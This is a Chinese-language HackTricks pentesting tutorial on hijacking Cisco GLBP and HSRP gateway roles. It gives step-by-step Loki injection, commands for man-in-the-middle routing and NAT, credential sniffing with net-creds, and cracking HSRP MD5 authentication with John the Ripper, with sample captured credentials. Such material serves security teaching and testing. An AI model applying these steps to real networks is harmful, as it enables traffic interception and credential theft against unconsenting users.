# GLBP & HSRP 攻击

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中看到你的 **公司广告**吗？或者想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏品 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

**此页面内容来自** [**https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9**](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)\*\*\*\*

## FHRP 劫持 <a href="#6196" id="6196"></a>

### 什么是 FHRP？<a href="#b12d" id="b12d"></a>

FHRP（First Hop Redundancy Protocol）是一类网络协议，旨在创建一个热备份的路由系统。通过 FHRP，物理路由器可以组合成一个单一的逻辑设备，从而增加容错性并帮助分担负载。

**思科系统的工程师开发了两种 FHRP 协议，即 GLBP 和 HSRP，下面我将进行演示。**

### GLBP 协议 <a href="#8a26" id="8a26"></a>

**由思科系统的工程师开发。**与 HSRP 类似，该协议在 TCP/IP 协议栈之上实现，因此使用 UDP 传输层协议和端口号 3222 来转换服务信息。GLBP 路由器在同一逻辑组内交换特殊的“hello”数据包，每 3 秒发送一次，但如果在 10 秒内，同一组内的 GLBP 路由器没有收到来自其 GLBP 邻居的 hello 数据包，则将其视为“死亡”。然而，计时器的值可以根据管理员的需求进行配置。

### GLBP 的框架和机制 <a href="#3bb3" id="3bb3"></a>

GLBP 提供了对多个路由器（网关）使用一个虚拟 IP 地址和多个虚拟 MAC 地址的负载共享。每个主机都配置了相同的虚拟 IP 地址，并且虚拟组中的所有路由器都参与数据包传输。

与 HSRP 和 VRRP 协议的工作方式大不相同，因为它使用真正的负载均衡机制，我将在下面进行说明：

**主机相关。**在存在 NAT 的网络上使用的一种负载均衡类型。主机相关保证主机将获得之前使用的 AVF 设备的相同 MAC 地址，因此对主机进行的 NAT 配置不会被破坏。

**轮询。**在此模式下，AVG 设备交替分配 MAC 地址给 AVF 成员。这是默认使用的机制。

**基于权重的轮询**。基于特殊的“权重”指标进行负载均衡。

### GLBP 域中的角色和术语 <a href="#febd" id="febd"></a>

**AVG（Active Virtual Gateway）** —— 担任领导角色的路由器，还负责向 GLBP 组内的其他路由器分配 MAC 地址。在 GLBP 域中的一种“老大”角色。当 ARP 请求到达时，AVG 通过分发 MAC 地址告诉其他路由器如何分配流量。值得注意的是，在 GLBP 域中只能有一个 AVG 路由器，但它也可以是 AVF 成员。

**AVF（Active Virtual Forwarder）** —— 在 GLBP 组中处理网络流量的路由器。

**GLBP 优先级** —— 确定 GLBP 组中哪个路由器将成为 AVG 的优先级值。默认值为 100（优先级范围可以从 1 到 255）。可以手动设置，即网络工程师自己确定哪个路由器将成为“上级”和哪个将成为“从属”。优先级越高，路由器成为 AVG 的可能性越大。通常将 AVG 角色赋予更强大的路由器。

**GLBP 权重** —— GLBP 组中路由器的所谓 GLBP 权重值。GLBP 权重定义了路由器的负载水平。该值是“浮动”的，可以根据物理通道的负载而变化（涉及到对象跟踪机制），但也可以手动配置。

**GLBP 虚拟 IP 地址** —— GLBP 域中的虚拟 IP 地址。用作合法主机的默认网关地址。

GLBP 使用保留的组播 IP 地址 **224.0.0.102** 和 UDP 传输层协议端口号 **3222** 来发送和处理服务信息。特殊的 GLBP Hello 数据包每 **3 秒**发送一次。如果 GLBP 路由器在 **10 秒**内没有从邻居处收到 hello 数据包，则该邻居将被视为“死亡”，并退出 GLBP 域。
### GLBP攻击机制 <a href="#3260" id="3260"></a>

这种网络攻击的技术是通过**注入一个恶意的GLBP数据包，带有最大优先级值，将您的设备强制成为主路由器。** **成功利用此漏洞会导致DoS或MITM攻击，您可以在网络中拦截流量，进行重定向，或者通过接管AVG路由器的角色来造成DoS。** 您只需要构建一个具有最高优先级值255的GLBP数据包，并将其指向本地网络。

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (2).png" alt=""><figcaption></figcaption></figure>

### GLBP注入（Loki） <a href="#fb69" id="fb69"></a>

为了演示此攻击，我将使用[**Loki**](https://github.com/raizo62/loki\_on\_kali)。它将执行一个恶意的GLBP注入，优先级值为255，权重值为255。但在执行攻击之前，需要检查以下信息：

* **在GLBP域中使用的虚拟IP地址**
* **认证的可用性**
* **路由器优先级的值**

我们可以通过分析GLBP流量来提取这些信息。我们将使用**Wireshark**。

正如我们所见，GLBP过程中只涉及两个路由器：**10.10.100.100和10.10.100.200。**

<figure><img src="../../.gitbook/assets/image (158) (3).png" alt=""><figcaption><p><strong>GLBP广告</strong></p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption><p>第一个路由器的GLBP广告</p></figcaption></figure>

分析GLBP流量后，我们得到以下结果：

* **检测到优先级设置中的配置错误。AVG路由器被认为是具有优先级200的GLBP路由器，即我们有一个用于GLBP劫持的向量**
* **没有认证**
* **在GLBP域中使用的虚拟IP地址是10.10.100.254**

有了这些信息，**我们可以轻松攻击GLBP。**

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption><p>Loki发现了来自两个路由器的GLBP广告</p></figcaption></figure>

在进行攻击之前，**切换到混杂模式并允许流量路由：**
```
~$ sudo ip link set eth0 promisc on
~$ sudo sysctl -w net.ipv4.ip_forward=1
```
选择IP地址为**10.10.100.100**的路由器，并激活**获取IP**选项。您还需要生成一个**Gratuitous ARP**。

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (161) (2).png" alt=""><figcaption><p>恶意GLBP注入的结构</p></figcaption></figure>

正如您所见，AVG路由器现在假装成为一个攻击系统。**优先级值为255，权重值为255，即最大值。**

**在执行注入之后，我们需要在网络接口上创建一个次要IP地址，其值为GLBP域中的虚拟IP地址。您还需要设置一个24位掩码。**

**这样，合法的流量将被循环返回给我们，因为在GLBP域中使用的虚拟IP地址是主机的默认网关地址：**
```
~$ sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
```
为了不仅查看传入流量还能查看传出流量，我们需要一个用于SNAT（伪装）的小规则：
```
~$ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
**我们还需要在我们的机器上删除默认路由，并编写一个新的路由，该路由将通过以前的AVG路由器（地址为10.10.100.100）进行。**尽管我们已经劫持了路由器的AVG角色，但它仍然能够路由流量。
```
~$ sudo route del default
~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
就是这样，**我们现在是“中间人”！**我将运行工具[**net-creds.py**](https://github.com/DanMcInerney/net-creds)来分析流量以寻找重要数据。**例如，未加密的FTP流量或NTLM哈希。**
```
~$ sudo python2 net-creds.py -i eth0
```
运行该实用程序后，我将尝试使用位于GLBP路由器后面的IP地址**172.16.100.70**读取SMB共享。
```
user@Boundless:~$ smbclient -L \\172.16.100.70 --user mercy
```
<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

**这是通过攻击GLBP域来拦截网络流量的方法。**

### HSRP劫持 <a href="#595f" id="595f"></a>

**HSRP（热备份路由器/冗余协议）**是Cisco的专有协议，允许网络网关冗余。总体思路是将多个物理路由器组合成一个具有共同IP地址的逻辑路由器。虚拟路由器的地址将分配给具有主要角色的路由器的接口，后者将负责流量转发。在HSRP域中，处理所有流量的任务完全落在具有主要角色的路由器上，与GLBP不同，GLBP提出使用特殊度量（优先级和权重）进行负载平衡。

### HSRP域中的角色和术语 <a href="#4185" id="4185"></a>

**HSRP活动路由器** - 充当虚拟路由器，将源网络的流量转发到目标网络。\
**HSRP备用路由器** - 充当备用路由器，等待活动路由器失败。当主要活动路由器失败时，备用路由器将接管主要角色，并接管活动路由器的职责。\
**HSRP组** - 一组设备，确保逻辑路由器的操作和容错性。\
**HSRP MAC地址** - HSRP域中逻辑路由器的虚拟MAC地址。\
**HSRP虚拟IP地址** - 这是HSRP组中的特殊虚拟IP地址。此IP地址将作为终端主机的默认网关，用于逻辑路由器本身。

### HSRP协议版本 <a href="#eda3" id="eda3"></a>

HSRP协议有两个版本 - HSRPv1和HSRPv2。它们在以下参数上有所不同：

* **可能的逻辑组数。** HSRPv1最多可以有255个组。HSRPv2最多可以有4096个组。
* **多播IP地址。** HSRPv1使用IP地址**224.0.0.2**发送服务信息，HSRPv2使用**224.0.0.102**。
* **虚拟MAC地址。** HSRPv1使用**00:00:0C:07:AC:XX**作为其虚拟MAC地址。HSRPv2的虚拟MAC地址为**00:00:0C:9F:FX:XX**（其中XX是HSRP组号）。

HSRP使用保留的IP地址**224.0.0.2**或**224.0.0.102**（取决于HSRP版本）和UDP传输层协议，端口号为**1985**，用于广播和处理服务信息。特殊的HSRP Hello数据包每**3秒**发送一次。如果HSRP路由器在**10秒**内未收到邻居的Hello数据包，则将认为该邻居已“死亡”，并将退出HSRP域。

### HSRP攻击机制 <a href="#d4a3" id="d4a3"></a>

**这与GLBP劫持完全相同。我们需要执行恶意的HSRP注入，优先级值最大为255。**这使我们能够劫持活动路由器的角色，为**MITM**攻击打开了大门。但是，在进行攻击之前，我们需要检查以下信息：

* **HSRP域中使用的虚拟IP地址**
* **是否存在身份验证**
* **路由器优先级的值**

我们可以通过分析HSRP流量来提取这些信息。**让我们使用Wireshark。**

如屏幕截图所示，HSRP过程仅涉及两个具有地址10.10.100.100和10.10.100.200的路由器

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption><p>HSRP广告</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption><p>第一个HSRP路由器</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption><p>第二个HSRP路由器</p></figcaption></figure>

根据对HSRP流量的分析，我们得到以下结果：

* **检测到优先级设置中的配置错误。活动路由器被认为是具有优先级200的HSRP路由器，因此我们有了HSRP劫持的向量**
* **HSRP域中使用的虚拟IP地址为10.10.100.254**
* **使用了MD5身份验证**

在域中使用身份验证会束缚我们的手脚，但我会解决这个问题。

### HSRP身份验证绕过 <a href="#d9fd" id="d9fd"></a>

将HSRP流量转储保存为**.pcap**格式，以便提取器可以正确地从转储中提取MD5哈希。我将使用**hsrp2john.py**作为提取器：
```
~/cisconightmare/exfiltrate$ python2 hsrp2john.py hsrp_with_authentication.pcap
```
<figure><img src="../../.gitbook/assets/image (287).png" alt=""><figcaption><p>从HSRP流量转储中提取的MD5哈希</p></figcaption></figure>

我将使用**John the Ripper**破解这些哈希，将哈希本身指定为输入。并且使用**--wordlist**开关指定字典的路径：
```
~/cisconightmare/exfiltrate$ john hsrp_hashes --wordlist=wordlistforbrute
```
<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption><p>破解的HSRP域密码</p></figcaption></figure>

因此，我们有一个进入HSRP域的密钥 - **endgame**。

### HSRP注入（Loki）<a href="#6a2b" id="6a2b"></a>

我将使用相同的Loki来攻击HSRP协议。除其他功能外，它还具有关键注入功能，帮助我们绕过身份验证。在HSRP劫持部分，我们之前获得了有关HSRP域的所有必要信息。

启动Loki。

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption><p>Loki检测到HSRP广告</p></figcaption></figure>

在进行攻击之前，请不要忘记切换到混杂模式并允许流量路由：
```
~$ sudo ip link set eth0 promisc on
~$ sudo sysctl -w net.ipv4.ip_forward=1
```
选择具有地址为**10.10.100.100**和优先级为**200**的路由器。作为**Secret**参数，输入来自HSRP域的**破解密码**，生成Gratuitous ARP并选择**获取IP**选项。

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

**正如我们所看到的，活动路由器现在是我们的攻击系统。优先级值为255。**

**注入后，我们需要在网络接口上创建一个次要IP地址，其值为HSRP域中的虚拟IP地址。您还应指定24位掩码。这样，合法的流量将被回送给我们，因为在主机中，HSRP域中使用的虚拟IP地址是默认网关地址。**
```
~$ sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
```
**我们设置了众所周知的源NAT（伪装）来拦截所有流量：**
```
~$ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
**我们移除了我们机器上的默认路由，并写入一个新的路由，该路由将通过之前的活动路由器（其地址为10.10.100.100）进行通信。尽管我们劫持了路由器的活动角色，但它仍然能够路由流量。**
```
~$ sudo route del default
~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
**现在我们是“中间人”。让我们运行** [**net-creds.py**](https://github.com/DanMcInerney/net-creds)**：**
```
~$ sudo python2 net-creds.py -i eth0
```
在运行该工具后，我将尝试对位于172.16.100.140的FTP服务器进行身份验证：
```
~$ ftp 172.16.100.140
```
<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

因此，我们从FTP服务器获取到了凭据：**insomnia:betrayal**

这就是你可以攻击HSRP域并拦截流量的方法。基本上，一切都与GLBP类似。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
